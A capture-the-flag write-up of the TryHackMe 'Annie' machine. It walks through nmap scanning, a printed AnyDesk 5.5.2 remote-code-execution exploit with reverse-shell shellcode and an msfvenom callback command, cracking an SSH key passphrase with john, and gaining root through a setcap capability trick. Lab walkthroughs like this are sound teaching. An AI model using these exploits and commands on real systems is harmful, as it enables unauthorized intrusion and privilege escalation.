# TryHackMe: Annie


Annie is a **medium** difficulty Linux box on [TryHackMe](https://tryhackme.com/room/annie). This machine involved compromising a vulnerable AnyDesk installation and then abusing an uncommon SetUID binary to elevate privileges to root.

## Walkthrough
### Enumeration
#### Nmap
After exporting the hostname and IP to environment variables, I ran a basic nmap scan with default scripts and version detection against all ports. 

```console
$ sudo nmap -sC -sV -vv -p- -oA nmap/$name $ip
```

We can see that TCP ports 22 and 7070 are open. The higher numbered ports didn't turn out to be anything. 

```console
Nmap scan report for 10.10.58.196
Host is up, received reset ttl 61 (0.22s latency).

```

After some research, I found that TCP port 7070 is commonly used with AnyDesk software. To test that theory, I checked online for exploits for AnyDesk and found one that looked promising. 

![](../images/screenshots/Pasted%20image%2020220704132548.png)

I grabbed that exploit using `searchsploit`.

```console
$ searchsploit -m 49613
```

### Exploit
#### Updating the exploit code
Reviewing the code, we can see there are a couple of things we need to update for it to work. 

```python
# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution

import struct
import socket
import sys

ip = '192.168.x.x'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xcb\x46\x40"

shellcode += b"\xa6\xbf\x91\xca\x18\x4f\x69\xa5\x33\xa8\x42"
shellcode += b"\xc9\x46\x41\xd1\x2d\x0c\x96\xf8\x9a\x0e\xc9"

shellcode += b"\x1d\xc4\x43\x40\x6c\xed\xa4\xe0\xfb"

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')
```

>**NOTE:** This code runs with Python2. I'm sure there's a way to update the code to work with Python3, but I didn't try it.

To make this code work, we need to update the following:
- The 'ip' variable. This is the IP address of the THM machine. Leave the 'port' variable alone. 
- The shellcode. You can run the provided command, substituting your own LHOST and LPORT values. 

After updating those values and running the exploit with `python2 49613.py` we get a connection back to our `netcat` listener. 

![Testing](../images/screenshots/Pasted%20image%2020220704133946.png)

#### Stabilize the shell
Stablize the reverse shell with the following commands
```console
# Spawn a bash shell with Python
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Set the TERM environment variable
export TERM=xterm

# Background the shell
Ctrl+z

# Turn off echoing
stty raw -echo;fg
```

>**NOTE:** If you're using the ZSH shell, it's important to put `stty raw -echo;fg` all on one line. The shell seems to complain if you don't. 

Go ahead and grab the user flag. 

### SSH
Checking around annie's home directory, we find an SSH key that will let us get a more stable shell. Copy that key onto your attacking machine and change permissions using 

```console
$ chmod 600 annie.key
```

As soon as we try to SSH into the machine as the `annie` user, we find that the key has a passphrase. 

![](../images/screenshots/Pasted%20image%2020220704135152.png)

### Cracking the passphrase
To crack the passphrase for Annie's key, we need to use `ssh2john`. Depending on how you have `John the Ripper` installed, your installation location may be different, but you can find it with `locate ssh2john`. 

#### Get a John-compatible hash
In order to use `john` to get the passphrase, we need to get it into a compatible hash format. We can do that with `ssh2john`. 

```console
$ ssh2john.py annie.key > annie.hash
```

Once we have a compatible hash, we can use `john` to crack the passphrase. 

```console
$ john --wordlist=/opt/wordlists/rockyou.txt annie.hash
```

After a few minutes, the hash will crack and you'll have the passphrase. 

Awesome! We can get a stable SSH connection now and won't have to worry about a reverse shell dropping. 

### Privilege Escalation
#### Enumeration
From here, you're free to use whatever privilege escalation enumeration script you like (i.e., LinEnum, LinPEAS, Linux-Smart-Enumeration). Personally, I prefer LSE. If you don't like any of those, feel free to enumerate manually. 

#### Uncommon SetUID binary
Looking through the output of LSE, there's an uncommon binary with the setuid bit set. 

![](../images/screenshots/Pasted%20image%2020220704141246.png)

#### Setcap
The `setcap` binary allows the user to set file capabilities. To exploit this, we can make a copy of the `python3` binary and modify the capabilities of that file as detailed [here](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/). 

#### Copy the Python binary
First, make a copy of the `python3` binary in the annie home directory. 

```console
$ cp /usr/bin/python3 /home/annie/python3
```

#### Set the `cap_setuid+ep` capability
To escalate privileges, we're going to add the `cap_setuid+ep` capability to the local copy of the `python3` binary. This will allow us to set the effective user id of the created process (i.e., 0 for root). 

```console
$ setcap cap_setuid+ep /home/annie/python3
```

#### Spawn a new process as root
Now that we've set the capability on the local python binary, we can run the following command to escalate to root.

```console
$ ./python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

![](../images/screenshots/Pasted%20image%2020220704142433.png)

Now you grab the root flag and finsh the room.
